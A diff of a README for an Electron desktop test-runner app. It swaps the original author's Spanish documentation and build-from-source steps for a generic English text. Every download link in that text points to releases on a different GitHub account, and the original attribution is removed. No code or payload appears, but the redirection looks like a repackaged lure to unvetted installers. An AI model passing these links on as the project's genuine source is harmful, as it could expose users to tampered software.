@@ -1,225 +1,60 @@
-# 🧪 Test Runner - Desktop Testing Suite
+# 🎉 test-runner - Run Your Tests with Ease
 
-<div align="center">
+## 🚀 Description
+test-runner is a modern desktop application built with Electron. It helps you run, manage, and monitor unit and end-to-end tests efficiently. With features like watch mode, smart filters, and real-time results, it simplifies your testing process.
 
-**Una aplicación de escritorio moderna para ejecutar y gestionar tests unitarios y E2E**
+## 📥 Download Now
+[![Download test-runner](https://img.shields.io/badge/Download%20test--runner-v1.0-blue.svg)](https://github.com/iamkingsolee/test-runner/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Electron](https://img.shields.io/badge/Electron-38.1.2-blue.svg)](https://electronjs.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-16+-green.svg)](https://nodejs.org/)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-yellow.svg)](https://www.ecmascript.org/)
+## 🌐 Table of Contents
+- [Installation Instructions](#🛠️-installation-instructions)
+- [Features](#✨-features)
+- [System Requirements](#🖥️-system-requirements)
+- [Usage Guide](#📚-usage-guide)
+- [Support](#🆘-support)
 
-[🚀 Descargar](https://github.com/cmurestudillos/test-runner/releases) • [📖 Documentación](#-características) • [🐛 Reportar Bug](https://github.com/cmurestudillos/test-runner/issues) • [💡 Solicitar Feature](https://github.com/cmurestudillos/test-runner/issues)
+## 🛠️ Installation Instructions
 
-</div>
+To download and install test-runner, follow these steps:
 
----
+1. Visit the [Releases page](https://github.com/iamkingsolee/test-runner/releases) to find the latest version.
+2. Choose the appropriate version for your operating system (Windows, macOS, or Linux).
+3. Click on the download link for your chosen version.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Run the installer and follow the prompts to complete the installation.
 
-## ✨ **Características**
+You can also find instructions and updates on the Releases page: [Download here](https://github.com/iamkingsolee/test-runner/releases).
 
-### 🎯 **Core Features**
-- **🔍 Explorador Inteligente**: Detecta automáticamente archivos de test en tu proyecto
-- **⚡ Ejecución Rápida**: Ejecuta tests individuales o por grupos con un clic
-- **👁️ Watch Mode**: Monitoreo automático de cambios en archivos
-- **📊 Resultados en Tiempo Real**: Visualización de resultados mientras se ejecutan
-- **🎨 Interfaz Moderna**: Diseño limpio e intuitivo
+## ✨ Features
+- **Run Tests:** Execute your unit and E2E tests with simple clicks.
+- **Watch Mode:** Automatically re-runs tests when you save your code.
+- **Smart Filters:** Easily filter tests based on criteria that matter to you.
+- **Real-Time Results:** Get immediate feedback on test results.
+- **Cross-Framework Support:** Compatible with popular testing frameworks like Cypress, Jest, Mocha, and Playwright.
 
-### 🧪 **Soporte Multi-Framework**
-- **Jest** - Tests unitarios y de integración
-- **Mocha** - Framework de testing flexible
-- **Cypress** - Tests E2E modernos
-- **Playwright** - Tests cross-browser
-- **Vitest** - Testing ultrarrápido para Vite
-- **Y más...** - Compatible con cualquier runner de tests
+## 🖥️ System Requirements
+Make sure your computer meets these requirements to run test-runner smoothly:
 
-### 🎛️ **Gestión Avanzada**
-- **Filtros Inteligentes**: Por tipo (unitarios, E2E, integración)
-- **Consola Integrada**: Logs detallados en tiempo real  
-- **Estadísticas Live**: Contadores de tests pasados/fallados/ejecutándose
-- **Atajos de Teclado**: Workflow optimizado para desarrolladores
-- **Organización Visual**: Estructura de carpetas clara con indicadores de estado
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (any modern distribution)
+- **Memory:** 4 GB RAM or more
+- **Processor:** Dual-core processor or higher
+- **Disk Space:** At least 200 MB of free space
 
----
+## 📚 Usage Guide
+Once you have installed test-runner, here is how to use it:
 
-## 🚀 **Instalación**
+1. Open the application from your desktop or start menu.
+2. On the main screen, you will see options to load your test files.
+3. You can select a folder or specific files containing your tests.
+4. Choose your desired settings, such as enabling watch mode or applying filters.
+5. Click the "Run Tests" button to start the testing process.
+6. Monitor the results in real-time. You will see successes and failures as they happen.
 
-### Prerequisitos
-- Node.js 22+ 
-- npm o yarn
-- Proyecto con tests configurados
+## 🆘 Support
+If you encounter any issues while using test-runner, please check the following resources:
 
-### Clonar e instalar
-```bash
-git clone https://github.com/cmurestudillos/test-runner.git
-cd test-runner
-npm install
-```
+- **Documentation:** Comprehensive guides can be found in the documentation section on our GitHub page.
+- **Community Support:** Join our community forum to discuss and get help from other users.
+- **Issue Tracker:** Report bugs or request features through the issue tracker on GitHub.
 
-### Ejecutar en desarrollo
-```bash
-npm start          # Modo normal
-```
-
-### Construir para distribución
-```bash
-npm run package:mac      # Crear ejecutable mac
-npm run package:win      # Crear ejecutable windows
-npm run package:linux    # Crear ejecutable linux
-```
-
----
-
-## 📖 **Guía de Uso**
-
-### 1️⃣ **Seleccionar Proyecto**
-- Haz clic en **"📁 Seleccionar Proyecto"**
-- Navega hasta el directorio raíz de tu proyecto
-- La app escaneará automáticamente los archivos de test
-
-### 2️⃣ **Ejecutar Tests**
-- **Doble clic** en cualquier test para ejecutarlo
-- **Enter** sobre test seleccionado
-- **Watch mode** para ejecución automática
-
-### 3️⃣ **Monitorear Resultados**
-- Panel central muestra resultados detallados
-- Consola inferior con logs en tiempo real
-- Estadísticas actualizadas automáticamente
-
-### 4️⃣ **Filtrar y Organizar**
-- Filtros por tipo: Unitarios, E2E, Integración
-- Estructura de carpetas clara
-- Indicadores visuales de estado
-
----
-
-## ⌨️ **Atajos de Teclado**
-
-| Atajo | Acción |
-|-------|--------|----------------------------|
-| `Ctrl/Cmd + O` | Abrir proyecto             |
-| `Ctrl/Cmd + W` | Toggle watch mode          |
-| `Ctrl/Cmd + L` | Limpiar consola            |
-| `Enter`        | Ejecutar test seleccionado |
-|----------------|----------------------------|
-
----
-
-## 🏗️ **Arquitectura**
-
-```
-src/
-├── main.js              # Proceso principal de Electron
-├── renderer.js          # Lógica de la interfaz de usuario
-├── preload.js           # Comunicación segura IPC
-├── index.html           # Interfaz principal
-└── assets/
-    └── styles/
-        └── styles.css   # Estilos de la aplicación
-```
-
-### Tecnologías utilizadas
-- **Electron** - Framework de aplicaciones de escritorio
-- **Node.js** - Runtime de JavaScript
-- **Chokidar** - File watching para watch mode
-- **fs-extra** - Operaciones avanzadas de sistema de archivos
-
----
-
-## 🤝 **Contribuir**
-
-¡Las contribuciones son bienvenidas! Aquí te explico cómo:
-
-### 🐛 **Reportar Bugs**
-1. Verifica que el bug no haya sido reportado
-2. Crea un [issue](https://github.com/cmurestudillos/test-runner/issues) con:
-   - Descripción detallada
-   - Pasos para reproducir
-   - Sistema operativo y versión
-   - Capturas de pantalla (si aplica)
-
-### ✨ **Solicitar Features**
-1. Revisa las [issues existentes](https://github.com/cmurestudillos/test-runner/issues)
-2. Crea una nueva issue con:
-   - Descripción clara de la funcionalidad
-   - Casos de uso
-   - Mockups o ejemplos (opcional)
-
-### 🔧 **Desarrollar**
-1. Fork del repositorio
-2. Crea una rama: `git checkout -b feature/amazing-feature`
-3. Commit tus cambios: `git commit -m 'Add amazing feature'`
-4. Push: `git push origin feature/amazing-feature`
-5. Abre un Pull Request
-
-### 📋 **Tareas Pendientes**
-- [ ] Soporte para más frameworks de testing
-- [ ] Temas personalizables (dark/light mode)
-- [ ] Exportar reportes de tests
-- [ ] Integración con CI/CD
-- [ ] Plugin system
-- [ ] Tests paralelos
-
----
-
-## 📊 **Roadmap**
-
-### v1.1.0 (Próximo)
-- [ ] Dark mode / Light mode
-- [ ] Exportar reportes HTML/PDF
-- [ ] Soporte para Jest coverage
-- [ ] Configuración persistente
-
-### v1.2.0 (Futuro)
-- [ ] Plugin system
-- [ ] Integración con GitHub Actions
-- [ ] Tests paralelos
-- [ ] Comparación de rendimiento
-
-### v2.0.0 (Visión)
-- [ ] Editor de tests integrado
-- [ ] Debugging visual
-- [ ] Colaboración en tiempo real
-- [ ] Cloud sync
-
----
-
-## 📄 **Licencia**
-
-Este proyecto está licenciado bajo la Licencia MIT - ver el archivo [LICENSE](LICENSE) para detalles.
-
----
-
-## 👨‍💻 **Autor**
-
-**Carlos Mur** - *Creador y Mantenedor Principal*
-- 🐙 GitHub: [@cmurestudillos](https://github.com/cmurestudillos)
-
----
-
-## 🙏 **Agradecimientos**
-
-- [Electron.js](https://electronjs.org/) por el excelente framework
-- [Chokidar](https://github.com/paulmillr/chokidar) por el file watching
-- La comunidad de testing de JavaScript
-- Todos los contribuidores y testers beta
-
----
-
-## 📈 **Stats**
-
-<div align="center">
-
-![GitHub stars](https://img.shields.io/github/stars/cmurestudillos/test-runner?style=social)
-![GitHub forks](https://img.shields.io/github/forks/cmurestudillos/test-runner?style=social)
-![GitHub watchers](https://img.shields.io/github/watchers/cmurestudillos/test-runner?style=social)
-
-</div>
-
----
-
-<div align="center">
-
-**¿Te gusta el proyecto? ¡Dale una ⭐ en GitHub!**
-
-</div>
+Feel free to reach out if you have any further questions. Your feedback helps us improve!
